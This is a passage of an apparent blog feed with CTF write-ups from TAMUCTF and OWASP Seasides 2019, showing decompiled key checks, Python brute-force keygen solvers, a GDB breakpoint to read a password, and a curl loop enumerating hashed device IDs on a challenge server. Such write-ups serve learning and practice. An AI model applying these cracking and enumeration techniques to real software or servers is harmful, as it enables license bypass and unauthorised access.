*a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v2; </span><br><span class="line">  <span class="keyword">int</span> i; </span><br><span class="line">  <span class="keyword">int</span> v4; </span><br><span class="line">  _BYTE *v5; </span><br><span class="line">  v5 = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v2 = <span class="number">72</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] = ((a1[i] + <span class="number">12</span>) * v2 + <span class="number">17</span>) % <span class="number">70</span> + <span class="number">48</span>;</span><br><span class="line">    v2 = v5[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So Now we have the encrypted version of our key. So we can simply brute-force for chars in the range (33, 127).<br>Refer to <a href="https://www.asciitable.com"  target="_blank">asciitable</a>.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="number">72</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span> </span><br><span class="line"><span class="keyword">for</span> encC <span class="keyword">in</span> <span class="string">&quot;[OIonU2_&lt;__nK&lt;Ks&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> orgC <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">chr</span>, xrange(<span class="number">33</span>, <span class="number">127</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(encC) == (((<span class="built_in">ord</span>(orgC) + <span class="number">12</span>) * v2 + <span class="number">17</span>) % <span class="number">70</span> + <span class="number">48</span>):</span><br><span class="line">            s += orgC</span><br><span class="line">            v2 = <span class="built_in">ord</span>(encC)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> s</span><br></pre></td></tr></table></figure><p>We get </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">*Z2S<span class="string">&quot;+&#x27;)&quot;</span><span class="string">&quot;+&#x27;+<span class="subst">$(</span></span></span></span><br></pre></td></tr></table></figure><p>And we r finally done here. </p><p><a href="/img/tamu/keygenme/flag.png" class="gallery-item"><img src="/img/tamu/keygenme/flag.png"></a></p><hr><h2 id="noCCBytes"><a href="#noCCBytes" class="headerlink" title="noCCBytes"></a>noCCBytes</h2><p><a href="/img/tamu/noccbytesThumb.png" class="gallery-item"><img src="/img/tamu/noccbytesThumb.png"></a></p><p><a href="/files/tamu/noccbytes"  target="_blank">Download File</a></p><p>This challenge required us to set the right breakpoint but I wonder why it had somewhat less solves though.</p><p>So We have to bypass the password.  </p><p><a href="/img/tamu/noccbytes/1.png" class="gallery-item"><img src="/img/tamu/noccbytes/1.png"></a></p><p>So I fire up GDB and load the executable.<br>And the main function was calling a function named <strong>passCheck()</strong><br><a href="/img/tamu/noccbytes/2.png" class="gallery-item"><img src="/img/tamu/noccbytes/2.png"></a></p><p>You can see it’s exact name using <strong>info function</strong>.  </p><p><a href="/img/tamu/noccbytes/3.png"></a></p><p>After disassembling <strong>passCheck()</strong> I observed that it had a <strong>strcmp</strong> instruction.</p><p><a href="/img/tamu/noccbytes/4.png" class="gallery-item"><img src="/img/tamu/noccbytes/4.png"></a></p><p>Now moving on, I simply set a breakpoint on the <strong>strcmp</strong> instruction we found.</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *passCheck(char*)+120</span><br></pre></td></tr></table></figure><p>And after runnning the executable again, We can see our password residing in memory.   </p><p><a href="/img/tamu/noccbytes/5.png" class="gallery-item"><img src="/img/tamu/noccbytes/5.png"></a></p><p>Now we can head over to input our password using the netcat service and get the flag.</p><p><a href="/img/tamu/noccbytes/flag.png" class="gallery-item"><img src="/img/tamu/noccbytes/flag.png"></a></p><hr><h2 id="Cr4ckZ33C0d3"><a href="#Cr4ckZ33C0d3" class="headerlink" title="Cr4ckZ33C0d3"></a>Cr4ckZ33C0d3</h2><p><a href="/img/tamu/crackcodeThumb.png" class="gallery-item"><img src="/img/tamu/crackcodeThumb.png"></a></p><p><a href="/files/tamu/prodkey"  target="_blank">Download File</a></p><p>This challenge was the hardest in the reversing category acc. to me.  </p><p>At First I took the help of IDA Pro to get some Pseudocode.<br>I found that the main function is calling a <strong>verify_key</strong> function which later calls various <strong>check()</strong> functions and and checks if we have supplied the correct input by comparing it to some basic calculations.<br>I’ve basically broke down various check levels for you to take a look.  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> chk1 = a1[<span class="number">5</span>] == <span class="number">45</span> &amp;&amp; a1[<span class="number">11</span>] == <span class="number">45</span> &amp;&amp; a1[<span class="number">17</span>] == <span class="number">45</span> &amp;&amp; a1[<span class="number">23</span>] == <span class="number">45</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> chk2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1[<span class="number">1</span>] - <span class="number">48</span>) &lt;= <span class="number">9</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1[<span class="number">4</span>] - <span class="number">48</span>) &lt;= <span class="number">9</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1[<span class="number">6</span>] - <span class="number">48</span>) &lt;= <span class="number">9</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1[<span class="number">9</span>] - <span class="number">48</span>) &lt;= <span class="number">9</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1[<span class="number">15</span>] - <span class="number">48</span>) &lt;= <span class="number">9</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1[<span class="number">18</span>] - <span class="number">48</span>) &lt;= <span class="number">9</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1[<span class="number">22</span>] - <span class="number">48</span>) &lt;= <span class="number">9</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1[<span class="number">27</span>] - <span class="number">48</span>) &lt;= <span class="number">9</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1[<span class="number">28</span>] - <span class="number">48</span>) &lt;= <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> chk3 = a1[<span class="number">4</span>] - <span class="number">48</span> == <span class="number">2</span> * (a1[<span class="number">1</span>] - <span class="number">48</span>) + <span class="number">1</span> &amp;&amp; a1[<span class="number">4</span>] - <span class="number">48</span> &gt; <span class="number">7</span> &amp;&amp; a1[<span class="number">9</span>] == a1[<span class="number">4</span>] - (a1[<span class="number">1</span>] - <span class="number">48</span>) + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> chk4 = (a1[<span class="number">27</span>] + a1[<span class="number">28</span>]) % <span class="number">13</span> == <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> chk5 = (a1[<span class="number">27</span>] + a1[<span class="number">22</span>]) % <span class="number">22</span> == <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> chk6 = (a1[<span class="number">18</span>] + a1[<span class="number">22</span>]) % <span class="number">11</span> == <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> chk7 = (a1[<span class="number">22</span>] + a1[<span class="number">28</span>] + a1[<span class="number">18</span>]) % <span class="number">26</span> == <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> chk8 = (a1[<span class="number">1</span>] + a1[<span class="number">4</span>] * a1[<span class="number">6</span>]) % <span class="number">41</span> == <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v1 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((a1[<span class="number">15</span>] - a1[<span class="number">28</span>]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">30</span>;</span><br><span class="line"><span class="keyword">bool</span> chk9 = ((v1 + a1[<span class="number">15</span>] - a1[<span class="number">28</span>]) &amp; <span class="number">3</span>) - v1 == <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((a1[<span class="number">22</span>] + a1[<span class="number">4</span>]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">30</span>;</span><br><span class="line"><span class="keyword">bool</span> chk10 = ((v2 + a1[<span class="number">22</span>] + a1[<span class="number">4</span>]) &amp; <span class="number">3</span>) - v2 == <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> chk11 = a1[<span class="number">20</span>] == <span class="number">66</span> &amp;&amp; a1[<span class="number">21</span>] == <span class="number">66</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> chk12 = (a1[<span class="number">6</span>] + a1[<span class="number">15</span>] * a1[<span class="number">9</span>]) % <span class="number">10</span> == <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v3 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((a1[<span class="number">15</span>] + a1[<span class="number">4</span>] + a1[<span class="number">27</span>] - <span class="number">18</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>;</span><br><span class="line"><span class="keyword">bool</span> chk13 = ((v3 + a1[<span class="number">15</span>] + a1[<span class="number">4</span>] + a1[<span class="number">27</span>] - <span class="number">18</span>) &amp; <span class="number">0xF</span>) - v3 == <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> v4 = a1[<span class="number">28</span>] &lt; a1[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">bool</span> chk14 = ((v4 + a1[<span class="number">28</span>] - a1[<span class="number">9</span>]) &amp; <span class="number">1</span>) - v4 == <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> chk15 = a1[<span class="number">0</span>] == <span class="number">77</span>;</span><br></pre></td></tr></table></figure><p>After realizing that this could be brute-forced, I pulled out Sublime to code some mellow python.<br>And also, some characters don’t need to be guessed as there were some if statements which were just comparing the ascii value straightaway. </p><p>From the pseudocode we can observe that the <strong>chk2</strong> checks whether the specified value is particularly an integer value or not.<br>So I fixed the range from (48,58) in decimal .. You can check the ascii table <a href="https://www.asciitable.com"  target="_blank">here</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">120</span>] * <span class="number">29</span></span><br><span class="line"></span><br><span class="line">key[<span class="number">5</span>] = <span class="number">45</span></span><br><span class="line">key[<span class="number">11</span>] = <span class="number">45</span> </span><br><span class="line">key[<span class="number">17</span>] = <span class="number">45</span></span><br><span class="line">key[<span class="number">23</span>] = <span class="number">45</span></span><br><span class="line">key[<span class="number">0</span>] = <span class="number">77</span></span><br><span class="line">key[<span class="number">20</span>] = <span class="number">66</span></span><br><span class="line">key[<span class="number">21</span>] = <span class="number">66</span></span><br><span class="line"></span><br><span class="line">charRange = <span class="built_in">map</span>(<span class="built_in">int</span>, xrange(<span class="number">48</span>, <span class="number">58</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> charRange:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> charRange:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> charRange:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> charRange:</span><br><span class="line">                <span class="keyword">if</span> (b - <span class="number">48</span> == <span class="number">2</span> * (a - <span class="number">48</span>) + <span class="number">1</span> <span class="keyword">and</span> b - <span class="number">48</span> &gt; <span class="number">7</span> <span class="keyword">and</span> c == b - (a - <span class="number">48</span>) + <span class="number">2</span>):</span><br><span class="line">                    key[<span class="number">1</span>] = a  </span><br><span class="line">                    key[<span class="number">4</span>] = b</span><br><span class="line">                    key[<span class="number">9</span>] = c</span><br><span class="line">                <span class="keyword">if</span> (c + d) % <span class="number">13</span> == <span class="number">8</span> <span class="keyword">and</span> (c + b) % <span class="number">22</span> == <span class="number">18</span> <span class="keyword">and</span> (a + b) % <span class="number">11</span> == <span class="number">5</span> <span class="keyword">and</span> (b + d + a) % <span class="number">26</span> == <span class="number">4</span>:</span><br><span class="line">                    key[<span class="number">18</span>] = a</span><br><span class="line">                    key[<span class="number">22</span>] = b</span><br><span class="line">                    key[<span class="number">27</span>] = c</span><br><span class="line">                    key[<span class="number">28</span>] = d</span><br><span class="line">                v3 = ((a + key[<span class="number">4</span>] + key[<span class="number">27</span>] - <span class="number">18</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>;</span><br><span class="line">                <span class="keyword">if</span> ((v3 + a + key[<span class="number">4</span>] + key[<span class="number">27</span>] - <span class="number">18</span>) &amp; <span class="number">0xF</span>) - v3 == <span class="number">8</span>:</span><br><span class="line">                    key[<span class="number">15</span>] = a</span><br><span class="line">                <span class="keyword">if</span> (key[<span class="number">1</span>] + key[<span class="number">4</span>] * a) % <span class="number">41</span> == <span class="number">5</span>:</span><br><span class="line">                    key[<span class="number">6</span>] = a</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> key)</span><br></pre></td></tr></table></figure><p>If you ran, this script you may have got :</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M4xx9-8xx7x-xxx9x-6xBB2-xxx88</span><br></pre></td></tr></table></figure><p>So There are some values which are not really checked, and I’ve assummed them to be <strong>x</strong>.</p><p>Now we can head over to netcat to get our flag…<br>And Finally ..</p><p><a href="/img/tamu/crackcode/crackcodeflag.png" class="gallery-item"><img src="/img/tamu/crackcode/crackcodeflag.png"></a></p><p><a href="https://media.giphy.com/media/9Jcw5pUQlgQLe5NonJ/giphy-downsized.gif" class="gallery-item"><img src="https://media.giphy.com/media/9Jcw5pUQlgQLe5NonJ/giphy-downsized.gif"></a></p><p>Seriously this challenge required good logic skills. GIGS</p><p>At last there were many gigems …<br>And I loved ‘em all</p><p>Thanks for Reading this writeup..<br>Subscribe to my Newsletter for more updates regarding CTFs.<br>Also Feedback is always appreciated.<br>It won’t take much time though.  </p><p>And Keep Escalating the Privileges<br>Happy Hacking !!</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/2019/">2019</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/tamuctf/">tamuctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/tamu/">tamu</category>
      
      
      <comments>https://mrt4ntr4.github.io/Tamu-CTF-Writeups/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>OWASP Seasides CTF 2019</title>
      <link>https://mrt4ntr4.github.io/Seasides-CTF-Writeups/</link>
      <guid>https://mrt4ntr4.github.io/Seasides-CTF-Writeups/</guid>
      <pubDate>Thu, 28 Feb 2019 07:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      <enclosure url="https://mrt4ntr4.github.io/seasides/seasides.png" type="image"/>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/seasides/seasides.png" title="banner" class="gallery-item"><img src="/img/seasides/seasides.png" alt="banner"></a></p><p>After getting bored from TAMU CTF, I thought of giving Seasides CTF 2019, a try.<br>A big shoutout to Team AlCapwn for creating these awesome challenges. Although It was a 24 hr CTF Competition, but the challenges were really fun to solve and I learnt a lot from them as well.</p><p>This Post contains writeups to the following challs::</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p><a href="#thevice">The Vice</a>  </p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p><a href="#simpleencryption">Simple Encryption</a>  </p><h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><p><a href="#nondbg">NonDBG</a><br><a href="#breakthis">Break This</a>   </p><h1 id="TheVice"><a href="#TheVice" class="headerlink" title="TheVice"></a>TheVice</h1><h3 id="Task-Description"><a href="#Task-Description" class="headerlink" title="Task Description :"></a>Task Description :</h3><p><a href="/img/seasides/thevice.png" class="gallery-item"><img src="/img/seasides/thevice.png"></a></p><p>Browsing to the specified URL, I got some values regarding a device with a <strong>uuid = c4ca4238a0b923820dcc509a6f75849b</strong></p><p><a href="/img/seasides/vice1.png" class="gallery-item"><img src="/img/seasides/vice1.png"></a></p><p>It looked like a md5hash so I tried to crack it in the first place..<br>And to my surprise ..</p><p><a href="/img/seasides/vice3.png" class="gallery-item"><img src="/img/seasides/vice3.png"></a></p><p>So I made a simple brute-forcer in python which created md5 hashes of 1,2……49,50<br>And used a simple <strong>curl</strong> command to output the result of browser.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">m = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">  m = hashlib.md5()</span><br><span class="line">  m.update(<span class="built_in">str</span>(i))</span><br><span class="line">  res = m.hexdigest()</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27;&#123;&#125; =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i,res)</span><br><span class="line">  os.system(<span class="string">&#x27;curl http://35.200.147.161:32338/device/&#x27;</span>+res)</span><br></pre></td></tr></table></figure><p>And Our Flag was waiting for us at the <strong>‘45th’</strong></p><p><a href="/img/seasides/vice2.png" class="gallery-item"><img src="/img/seasides/vice2.png"></a></p><h1 id="SimpleEncryption"><a href="#SimpleEncryption" class="headerlink" title="SimpleEncryption"></a>SimpleEncryption</h1><h3 id="Task-Description-1"><a href="#Task-Description-1" class="headerlink" title="Task Description :"></a>Task Description :</h3><p><a href="/img/seasides/xor.png" class="gallery-item"><img src="/img/seasides/xor.png"></a></p><p><a href="/files/seasides/cipher.txt"  target="_blank">Download File</a></p><p>This Challenge was as easy as its Title says. XD</p><p>Its just a simple Single-byte XOR cipher which you could remember if you’ve solved cryptopals SET-1 challenges.<br>For this I pulled out my XOR key brute-forcer.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_english_score</span>(<span class="params">input_bytes</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Compares each input byte to a character frequency </span></span><br><span class="line"><span class="string">    chart and returns the score of a message based on the</span></span><br><span class="line"><span class="string">    relative frequency the characters occur in the English</span></span><br><span class="line"><span class="string">    language</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    character_frequencies = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="number">.08167</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">.01492</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">.02782</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">.04253</span>,</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>: <span class="number">.12702</span>, <span class="string">&#x27;f&#x27;</span>: <span class="number">.02228</span>, <span class="string">&#x27;g&#x27;</span>: <span class="number">.02015</span>, <span class="string">&#x27;h&#x27;</span>: <span class="number">.06094</span>,</span><br><span class="line">        <span class="string">&#x27;i&#x27;</span>: <span class="number">.06094</span>, <span class="string">&#x27;j&#x27;</span>: <span class="number">.00153</span>, <span class="string">&#x27;k&#x27;</span>: <span class="number">.00772</span>, <span class="string">&#x27;l&#x27;</span>: <span class="number">.04025</span>,</span><br><span class="line">        <span class="string">&#x27;m&#x27;</span>: <span class="number">.02406</span>, <span class="string">&#x27;n&#x27;</span>: <span class="number">.06749</span>, <span class="string">&#x27;o&#x27;</span>: <span class="number">.07507</span>, <span class="string">&#x27;p&#x27;</span>: <span class="number">.01929</span>,</span><br><span class="line">        <span class="string">&#x27;q&#x27;</span>: <span class="number">.00095</span>, <span class="string">&#x27;r&#x27;</span>: <span class="number">.05987</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">.06327</span>, <span class="string">&#x27;t&#x27;</span>: <span class="number">.09056</span>,</span><br><span class="line">        <span class="string">&#x27;u&#x27;</span>: <span class="number">.02758</span>, <span class="string">&#x27;v&#x27;</span>: <span class="number">.00978</span>, <span class="string">&#x27;w&#x27;</span>: <span class="number">.02360</span>, <span class="string">&#x27;x&#x27;</span>: <span class="number">.00150</span>,</span><br><span class="line">        <span class="string">&#x27;y&#x27;</span>: <span class="number">.01974</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">.00074</span>, <span class="string">&#x27; &#x27;</span>: <span class="number">.13000</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([character_frequencies.get(<span class="built_in">chr</span>(byte), <span class="number">0</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> input_bytes.lower()])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_char_xor</span>(<span class="params">input_bytes, char_value</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns the result of each byte being XOR&#x27;d with a single value.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    output_bytes = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> input_bytes:</span><br><span class="line">        output_bytes += <span class="built_in">bytes</span>([byte ^ char_value])</span><br><span class="line">    <span class="keyword">return</span> output_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    hexstring = <span class="string">&#x27;143c32733a207332732027322736733a3d732436202736213d731a3d373a3273243a273b73303c3220273f3a3d3620732027213627303b3a3d3473323f3c3d3473273b3673122132313a323d730036327d731a2720733f3c3d34733b3a20273c212a733220733273033c212726342636203673303c3f3c3d2a7323213a3c2173273c73626a6562733a207336253a37363d27733a3d733a272073232136203621253637736264273b7e30363d2726212a73303b2621303b362073323d3773273b367332213632b1d3ca207327213c233a30323f7320233a303673233f323d2732273a3c3d207d73143c32733a2073323f203c73383d3c243d73353c21733a272073313632303b36207f7321323d343a3d347335213c3e73233c23263f3221732027213627303b3620733227731132343273323d377303323f3c3f363e73273c73273b3c2036733a3d733f323a377e3132303873353a203b3a3d3473253a3f3f32343620732026303b7332207312343c3d37327d73073b3673313632303b3620733a3d73273b367335322173003c26273b73323d3773273b3673353221273b362027731d3c21273b7332213673273b3673313620277d731d3c21273b73143c3273262026323f3f2a7327363d372073273c73313673123d39263d327c05323432273c217332213632737b373630363d277f7330213c2437363773313632303b36207a73323d377310323d373c3f3a3e7c113234327b2536212a7330213c2437363773313632303b36207a7f73323d377312203b24363e7c1221323e313c3f737b35263d73303f36323d7f7323213627272a73313632303b36207a7d73203632286404630c62660c1160646460010c641b131d0c631d602e203a37362073143c32733a20733273303c322027323f732136343a3c3d733f3c3032273637733a3d73273b36732436202736213d7323322127733c35731a3d373a327335323e3c2620733220733e3c202773233c23263f322173273c26213a202773373620273a3d32273a3c3d7d73113c263d37363773312a73122132313a323d73003632733c3d733c3d3673203a373673323d37733f323d37733c3d73273b36733c273b362173203a3736207f73273b3a20732136343a3c3d73313c3220272073606373323d37733e3c213673313632303b36207d&#x27;</span></span><br><span class="line">    ciphertext = <span class="built_in">bytes</span>.fromhex(hexstring)</span><br><span class="line">    potential_messages = []</span><br><span class="line">    <span class="keyword">for</span> key_value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        message = single_char_xor(ciphertext, key_value)</span><br><span class="line">        score = get_english_score(message)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: message,</span><br><span class="line">            <span class="string">&#x27;score&#x27;</span>: score,</span><br><span class="line">            <span class="string">&#x27;key&#x27;</span>: key_value</span><br><span class="line">            &#125;</span><br><span class="line">        potential_messages.append(data)</span><br><span class="line">    best_score = <span class="built_in">sorted</span>(potential_messages, key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;score&#x27;</span>], reverse=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> best_score:</span><br><span class="line">        print(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(item.title(), best_score[item]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>The Key was <strong>83</strong><br>As Simple as it says… ;D</p><p><a href="/img/seasides/xor1.png" class="gallery-item"><img src="/img/seasides/xor1.png"></a></p><h1 id="NonDBG"><a href="#NonDBG" class="headerlink" title="NonDBG"></a>NonDBG</h1><h3 id="Task-Description-2"><a href="#Task-Description-2" class="headerlink" title="Task Description :"></a>Task Description :</h3><p><a 